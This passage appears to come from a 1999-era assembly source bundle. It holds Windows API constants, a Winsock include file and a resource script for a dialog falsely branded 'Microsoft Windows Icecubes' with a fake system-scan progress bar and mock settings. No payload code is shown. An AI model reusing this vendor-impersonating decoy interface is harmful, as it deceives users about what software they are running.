SM_PENWINDOWS         =  41
SM_DBCSENABLED        =  42
ENDIF
SM_CMETRICSMAX        =  43

ENDIF   ;NOSYSMETRICS

IFNDEF  NOCOLOR

COLOR_SCROLLBAR           = 0
COLOR_BACKGROUND          = 1
COLOR_ACTIVECAPTION       = 2
COLOR_INACTIVECAPTION     = 3
COLOR_MENU                = 4
COLOR_WINDOW              = 5
COLOR_WINDOWFRAME         = 6
COLOR_MENUTEXT            = 7
COLOR_WINDOWTEXT          = 8
COLOR_CAPTIONTEXT         = 9
COLOR_ACTIVEBORDER        = 10
COLOR_INACTIVEBORDER      = 11
COLOR_APPWORKSPACE        = 12
COLOR_HIGHLIGHT           = 13
COLOR_HIGHLIGHTTEXT       = 14
COLOR_BTNFACE             = 15
COLOR_BTNSHADOW           = 16
COLOR_GRAYTEXT            = 17
COLOR_BTNTEXT             = 18
IFNDEF NOWIN31
COLOR_INACTIVECAPTIONTEXT = 19
COLOR_BTNHILIGHT          = 20
ENDIF
ENDIF   ;NOCOLOR

; Commands to pass WinHelp()
HELP_CONTEXT    =0001h  ;/* Display topic in ulTopic */
HELP_QUIT       =0002h  ;/* Terminate help */
HELP_INDEX      =0003h  ;/* Display index */
HELP_HELPONHELP =0004h  ;/* Display help on using help */
HELP_SETINDEX   =0005h  ;/* Set the current Index for multi index help */
HELP_KEY        =0101h  ;/* Display topic for keyword in offabData */

IFNDEF NOCOMM

NOPARITY        =   0
ODDPARITY       =   1
EVENPARITY      =   2
MARKPARITY      =   3
SPACEPARITY     =   4

ONESTOPBIT      =   0
ONE5STOPBITS    =   1
TWOSTOPBITS     =   2

IGNORE          =   0      ; /* Ignore signal    */
INFINITE        =   0FFFFh ; /* Infinite timeout */

; Error Flags
CE_RXOVER       =    0001h ; /* Receive Queue overflow       */
CE_OVERRUN      =    0002h ; /* Receive Overrun Error        */
CE_RXPARITY     =    0004h ; /* Receive Parity Error         */
CE_FRAME        =    0008h ; /* Receive Framing error        */
CE_BREAK        =    0010h ; /* Break Detected               */
CE_CTSTO        =    0020h ; /* CTS Timeout                  */
CE_DSRTO        =    0040h ; /* DSR Timeout                  */
CE_RLSDTO       =    0080h ; /* RLSD Timeout                 */
CE_TXFULL       =    0100h ; /* TX Queue is full             */
CE_PTO          =    0200h ; /* LPTx Timeout                 */
CE_IOE          =    0400h ; /* LPTx I/O Error               */
CE_DNS          =    0800h ; /* LPTx Device not selected     */
CE_OOP          =    1000h ; /* LPTx Out-Of-Paper            */
CE_MODE         =    8000h ; /* Requested mode unsupported   */

IE_BADID        =    (-1)  ;  /* Invalid or unsupported id    */
IE_OPEN         =    (-2)  ;  /* Device Already Open          */
IE_NOPEN        =    (-3)  ;  /* Device Not Open              */
IE_MEMORY       =    (-4)  ;  /* Unable to allocate queues    */
IE_DEFAULT      =    (-5)  ;  /* Error in default parameters  */
IE_HARDWARE     =    (-10) ;  /* Hardware Not Present         */
IE_BYTESIZE     =    (-11) ;  /* Illegal Byte Size            */
IE_BAUDRATE     =    (-12) ;  /* Unsupported BaudRate         */

; Events
EV_RXCHAR       =    0001h ; /* Any Character received       */
EV_RXFLAG       =    0002h ; /* Received certain character   */
EV_TXEMPTY      =    0004h ; /* Transmitt Queue Empty        */
EV_CTS          =    0008h ; /* CTS changed state            */
EV_DSR          =    0010h ; /* DSR changed state            */
EV_RLSD         =    0020h ; /* RLSD changed state           */
EV_BREAK        =    0040h ; /* BREAK received               */
EV_ERR          =    0080h ; /* Line status error occurred   */
EV_RING         =    0100h ; /* Ring signal detected         */
EV_PERR         =    0200h ; /* Printer error occured        */
EV_CTSS         =    0400h ; /* CTS state                    */
EV_DSRS         =    0800h ; /* DSR state                    */
EV_RLSDS        =    1000h ; /* RLSD state                   */
EV_RingTe       =    2000h ; /* Ring Trailing Edge Indicator */


; Escape Functions
SETXOFF         =    1     ;  /* Simulate XOFF received       */
SETXON          =    2     ;  /* Simulate XON received        */
SETRTS          =    3     ;  /* Set RTS high                 */
CLRRTS          =    4     ;  /* Set RTS low                  */
SETDTR          =    5     ;  /* Set DTR high                 */
CLRDTR          =    6     ;  /* Set DTR low                  */
RESETDEV        =    7     ;  /* Reset device if possible     */

LPTx            =    80h   ; /* Set if ID is for LPT device  */

IFNDEF NOWIN31
; new escape functions
GETMAXLPT   equ  8         ; Max supported LPT id
GETMAXCOM   equ  9         ; Max supported COM id
GETBASEIRQ  equ 10         ; Get port base & irq for a port

; Comm Baud Rate indices
CBR_110     equ 0FF10h
CBR_300     equ 0FF11h
CBR_600     equ 0FF12h
CBR_1200    equ 0FF13h
CBR_2400    equ 0FF14h
CBR_4800    equ 0FF15h
CBR_9600    equ 0FF16h
CBR_14400   equ 0FF17h
CBR_19200   equ 0FF18h
;               0FF19h  (reserved)
;               0FF1Ah  (reserved)
CBR_38400   equ 0FF1Bh
;               0FF1Ch  (reserved)
;               0FF1Dh  (reserved)
;               0FF1Eh  (reserved)
CBR_56000   equ 0FF1Fh
;               0FF20h  (reserved)
;               0FF21h  (reserved)
;               0FF22h  (reserved)
CBR_128000  equ 0FF23h
;               0FF24h  (reserved)
;               0FF25h  (reserved)
;               0FF26h  (reserved)
CBR_256000  equ 0FF27h

; notifications passed in low word of lParam on WM_COMMNOTIFY messages
CN_RECEIVE  equ 1           ; bytes are available in the input queue
CN_TRANSMIT equ 2           ; fewer than wOutTrigger bytes still
                            ; remain in the output queue waiting
                            ; to be transmitted.
CN_EVENT    equ 4           ; an enabled event has occurred

ENDIF


DCB     struc
    DCB_Id             db ?  ; /* Internal Device ID              */
    DCB_BaudRate       dw ?  ; /* Baudrate at which runing        */
    DCB_ByteSize       db ?  ; /* Number of bits/byte, 4-8        */
    DCB_Parity         db ?  ; /* 0-4=None,Odd,Even,Mark,Space    */
    DCB_StopBits       db ?  ; /* 0,1,2 = 1, 1.5, 2               */
    DCB_RlsTimeout     dw ?  ; /* Timeout for RLSD to be set      */
    DCB_CtsTimeout     dw ?  ; /* Timeout for CTS to be set       */
    DCB_DsrTimeout     dw ?  ; /* Timeout for DSR to be set       */

    DCB_BitMask1       db ?

    ;   BYTE fBinary: 1;     /* Binary Mode (skip EOF check     */
    ;   BYTE fRtsDisable:1;  /* Don't assert RTS at init time   */
    ;   BYTE fParity: 1;     /* Enable parity checking          */
    ;   BYTE fOutxCtsFlow:1; /* CTS handshaking on output       */
    ;   BYTE fOutxDsrFlow:1; /* DSR handshaking on output       */
    ;   BYTE fDummy: 2;      /* Reserved                        */
    ;   BYTE fDtrDisable:1;  /* Don't assert DTR at init time   */

    DCB_BitMask2       db ?

    ;   BYTE fOutX: 1;       /* Enable output X-ON/X-OFF        */
    ;   BYTE fInX: 1;        /* Enable input X-ON/X-OFF         */
    ;   BYTE fPeChar: 1;     /* Enable Parity Err Replacement   */
    ;   BYTE fNull: 1;       /* Enable Null stripping           */
    ;   BYTE fChEvt: 1;      /* Enable Rx character event.      */
    ;   BYTE fDtrflow: 1;    /* DTR handshake on input          */
    ;   BYTE fRtsflow: 1;    /* RTS handshake on input          */
    ;   BYTE fDummy2: 1;

    DCB_XonChar        db ? ; /* Tx and Rx X-ON character        */
    DCB_XoffChar       db ? ; /* Tx and Rx X-OFF character       */
    DCB_XonLim         dw ? ; /* Transmit X-ON threshold         */
    DCB_XoffLim        dw ? ; /* Transmit X-OFF threshold        */
    DCB_PeChar         db ? ; /* Parity error replacement char   */
    DCB_EofChar        db ? ; /* End of Input character          */
    DCB_EvtChar        db ? ; /* Recieved Event character        */
    DCB_TxDelay        dw ? ; /* Amount of time between chars    */
DCB     ends

COMSTAT     struc
    COMS_BitMask1   db ?

;    BYTE fCtsHold: 1;   /* Transmit is on CTS hold         */
;    BYTE fDsrHold: 1;   /* Transmit is on DSR hold         */
;    BYTE fRlsdHold: 1;  /* Transmit is on RLSD hold        */
;    BYTE fXoffHold: 1;  /* Received handshake              */
;    BYTE fXoffSent: 1;  /* Issued handshake                */
;    BYTE fEof: 1;       /* End of file character found     */
;    BYTE fTxim: 1;      /* Character being transmitted     */


    COMS_cbInQue    dw ?  ;   /* count of characters in Rx Queue */
    COMS_cbOutQue   dw ?  ;   /* count of characters in Tx Queue */
COMSTAT     ends

ENDIF       ;NOCOM

;
; Installable Driver Support
;
; Driver Messages
DRV_LOAD            = 0001h
DRV_ENABLE          = 0002h
DRV_OPEN            = 0003h
DRV_CLOSE           = 0004h
DRV_DISABLE         = 0005h
DRV_FREE            = 0006h
DRV_CONFIGURE       = 0007h
DRV_QUERYCONFIGURE  = 0008h
DRV_INSTALL         = 0009h
DRV_REMOVE          = 000Ah
DRV_EXITSESSION     = 000Bh
DRV_POWER           = 000Fh
DRV_RESERVED        = 0800h
DRV_USER            = 4000h

;LPARAM of DRV_CONFIGURE message and return values
DRVCONFIGINFO struc
    DRVCNF_dwDCISize          dw ?
    DRVCNF_lpszDCISectionName dd ?
    DRVCNF_lpszDCIAliasName   dd ?
DRVCONFIGINFO ends

DRVCNF_CANCEL       = 0000h
DRVCNF_OK           = 0001h
DRVCNF_RESTART      = 0002h


IFNDEF  NOKERNEL
;
; Common Kernel errors
;
ERR_GALLOC      = 01030h        ; GlobalAlloc Failed
ERR_GREALLOC    = 01031h        ; GlobalReAlloc Failed
ERR_GLOCK       = 01032h        ; GlobalLock Failed
ERR_LALLOC      = 01033h        ; LocalAlloc Failed
ERR_LREALLOC    = 01034h        ; LocalReAlloc Failed
ERR_LLOCK       = 01035h        ; LocalLock Failed
ERR_ALLOCRES    = 01036h        ; AllocResource Failed
ERR_LOCKRES     = 01037h        ; LockResource Failed
ERR_LOADMODULE  = 01038h        ; LoadModule failed

;
; Common User Errors
;
ERR_CREATEDLG        =  01045h ; /* Create Dlg failure due to LoadMenu failure */
ERR_CREATEDLG2       =  01046h ; /* Create Dlg failure due to CreateWindow Failure */
ERR_REGISTERCLASS    =  01047h ; /* RegisterClass failure due to Class already registered */
ERR_DCBUSY           =  01048h ; /* DC Cache is full */
ERR_CREATEWND        =  01049h ; /* Create Wnd failed due to class not found */
ERR_STRUCEXTRA       =  01050h ; /* Unallocated Extra space is used */
ERR_LOADSTR          =  01051h ; /* LoadString() failed */
ERR_LOADMENU         =  01052h ; /* LoadMenu Failed     */
ERR_NESTEDBEGINPAINT =  01053h ; /* Nested BeginPaint() calls */
ERR_BADINDEX         =  01054h ; /* Bad index to Get/Set Class/Window Word/Long */
ERR_CREATEMENU       =  01055h ; /* Error creating menu */

;
; Common GDI Errors
;
ERR_CREATEDC        = 01070h    ; /* CreateDC/CreateIC etc., failure */
ERR_CREATEMETA      = 01071h    ; /* CreateMetafile failure */
ERR_DELOBJSELECTED  = 01072h    ; /* Bitmap being deleted is selected into DC */
ERR_SELBITMAP       = 01073h    ; /* Bitmap being selected is already selected elsewhere */

ENDIF       ;NOKERNEL
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[WINDOWS.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WSOCKS.INC]컴�
;
;      WSocks.inc: include file for windows sockets .
;      Designed for TASM5 and Win32.
;
;      (C) 1999 Bumblebee.
;
;       This file contains basic structures and stuff to work
;       with windows sockets.
;

; Descriptions of the API:
;  arguments in order of PUSH ;)

; only for debug
extrn   WSAGetLastError:PROC

; starts the use of winsock dll
; addr WSADATA, version requested
; returns: 0 ok
extrn	WSAStartup:PROC

; terminates the use of winsock dll
; returns: SOCK_ERR on error
extrn	WSACleanup:PROC

; opens a new socket
; protocol (PCL_NONE), type (SOCK_??), addr format (AF_??)
; returns: socket id or SOCKET_ERR (socket is dw)
extrn	socket:PROC

; closes a socket
; socket descriptor
;
extrn   closesocket:PROC

; sends data (this socks are a shit... Unix uses simple write)
; flags (1  OOB data or 0 normal ) , length, addr of buffer, socket
; returns: caracters sent or SOCKET_ERR on error
extrn   send:PROC

; reveives data (this socks are a shit... Unix uses simple read)
; flags (use 0), length, addr of buffer, socket
; returns: caracters sent or SOCKET_ERR on error
extrn   recv:PROC

; connects to a server
; sizeof struct SOCKADDR, struct SOCKADDR, socket
; returns: SOCKET_ERR on error
extrn	connect:PROC

; gets the name of the current host
; length of the buffer for name, addr of buffer for name
; return: SOCKET_ERR on error
extrn   gethostname:PROC

; gets strcut hostent
; addr of name
; returns: ponter to the struct or 0 on error
extrn   gethostbyname:PROC

; converts a zstring like "xxx.xxx.xx...." to netw byte order
; zstring ptr to change to dotted addr format
; returns: in_addr (dd)
extrn 	inet_addr:PROC

; dw to convert into netw byte order (usually the port)
; returns: the value in network byte order (dw)
extrn   htons:PROC

; Structs :o

; sockaddr struct for connection
; modified (for better use)
; if you want the original look for it into a winsock.h
SOCKADDR        struct
sin_family	dw	0	; ex. AF_INET
sin_port	dw	0	; use htons for this
sin_addr        dd      0       ; here goes server node (from inet_addr)
sin_zero	db	8 dup(0)
SOCKADDR        ends

; for WSAStartup diagnose
WSADATA		struct
mVersion	dw	0
mHighVersion	dw	0
szDescription	db	257 dup(0)
szSystemStatus	db	129 dup(0)
iMaxSockets	dw	0
iMaxUpdDg	dw	0
lpVendorInfo	dd	0
WSADATA		ends

; Some nice equs 

; what version of winsock do you need? (usually 1.1)
VERSION1_0      equ     0100h
VERSION1_1      equ     0101h
VERSION2_0      equ     0200h

AF_UNIX		equ	1	; local host
AF_INET         equ     2       ; internet (most used)
AF_IMPLINK	equ	3	; arpanet
AF_NETBIOS	equ	17	; NetBios style addresses

; types of sockets
SOCK_STREAM     equ     1       ; stream (connection oriented; telnet like)
SOCK_DGRAM      equ     2       ; datagram (packets, packets, packets)

; protocol
PCL_NONE        equ     0       ; none (define the protocol not needed)

SOCKET_ERR      equ     -1      ; standard winsock error

HOSTENT_IP      equ     10h     ; where is the IP into the hostent struct
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�[WSOCKS.INC]컴�
컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[ICECUBES.RC]컴�
#define IDM_ABOUTBOX                    0x0010
#define IDD_ABOUTBOX                    100
#define IDS_ABOUTBOX                    101
#define IDD_VKS_DIALOG_0                102
#define IDD_VKS_DIALOG_1                103
#define IDR_MAINFRAME                   128
#define IDC_CHECK1                      1000
#define IDC_CHECK2                      1001
#define IDC_EDIT3                       1003
#define IDC_SPIN1                       1018
#define IDC_COMBO1                      1004
#define IDC_EDIT1                       1005
#define IDC_CHECK3                      1006
#define IDC_CHECK4                      1007
#define IDC_EDIT2                       1008
#define IDC_BUTTON1                     1009
#define IDC_BUTTON2                     1014
#define IDC_CHECK5                      1010
#define IDC_RADIO1                      1012
#define IDC_RADIO2                      1013
#define IDC_STATIC                      1015
#define IDC_STATIC2                     1016


11 ICON "icecubes.ico"

IDD_VKS_DIALOG_0 DIALOG 0, 0, 255, 20
STYLE DS_MODALFRAME | DS_3DLOOK | DS_CENTER | WS_POPUP | WS_VISIBLE | 
    WS_CAPTION | WS_SYSMENU
CAPTION "Scanning system for Microsoft Windows Icecubes..."
FONT 8, "Verdana"
BEGIN
    CONTROL         "",105,"msctls_progress32",WS_CLIPSIBLINGS,5,5,244,11
END


IDD_VKS_DIALOG_1 DIALOG 0, 0, 233, 252
STYLE DS_MODALFRAME | DS_3DLOOK | WS_POPUP | WS_VISIBLE | WS_CAPTION | WS_SYSMENU
EXSTYLE WS_EX_APPWINDOW
CAPTION "Microsoft Windows Icecubes"
FONT 8, "MS Sans Serif"
BEGIN

    LTEXT           "Manufacturer's default settings (not to be edited)",
                    IDC_STATIC,13,8,200,8

    GROUPBOX        "Endurance options",IDC_STATIC,7,23,218,53
    CONTROL         "Crash every",IDC_CHECK1,"Button",BS_AUTOCHECKBOX | 
                    WS_TABSTOP,15,36,50,10
    CONTROL         "Crash after",IDC_CHECK2,"Button",BS_AUTOCHECKBOX | 
                    WS_TABSTOP,15,54,50,10

    EDITTEXT        IDC_EDIT3,75,35,34,12,ES_AUTOHSCROLL
    CONTROL         "Spin1",IDC_SPIN1,"msctls_updown32",UDS_ARROWKEYS,108,35,
                    8,12

    COMBOBOX        IDC_COMBO1,130,35,72,85,CBS_DROPDOWNLIST | CBS_SORT | 
                    WS_VSCROLL | WS_TABSTOP

    EDITTEXT        IDC_EDIT1,75,53,43,13,ES_AUTOHSCROLL
    LTEXT           "bytes of un-saved  changes",IDC_STATIC,130,55,94,13


    GROUPBOX        "Save options",IDC_STATIC,7,81,218,69
    CONTROL         "Create incredibly large files",IDC_CHECK3,"Button",
                    BS_AUTOCHECKBOX | WS_TABSTOP,15,94,163,10
    CONTROL         "Allow me to carry on typing during AutoRecovery saves",
                    IDC_CHECK4,"Button",BS_AUTOCHECKBOX | WS_TABSTOP,15,112,
                    195,10
    LTEXT           "Fail AutoRecovery at",IDC_STATIC,25,130,120,13
    LTEXT           "percent",IDC_STATIC2,125,130,50,13

    EDITTEXT        IDC_EDIT2,100,128,18,12,ES_AUTOHSCROLL

    GROUPBOX        "Other options",IDC_STATIC,7,157,218,70
    CONTROL         "Decrease boot speed by 70%",IDC_CHECK5,"Button",
                    BS_AUTOCHECKBOX | WS_TABSTOP,15,170,190,14
    CONTROL         "constantly",IDC_RADIO1,"Button",BS_AUTORADIOBUTTON,35,
                    198,48,10
    CONTROL         "when I least expect it",IDC_RADIO2,"Button",
                    BS_AUTORADIOBUTTON,35,210,83,10
    LTEXT           "Annoy me with that sodding paperclip",IDC_STATIC,25,186,
                    136,10

    PUSHBUTTON   "Cancel",IDC_BUTTON1,122,233,50,12
    DEFPUSHBUTTON   "Ok",IDC_BUTTON2,64,233,50,12

END



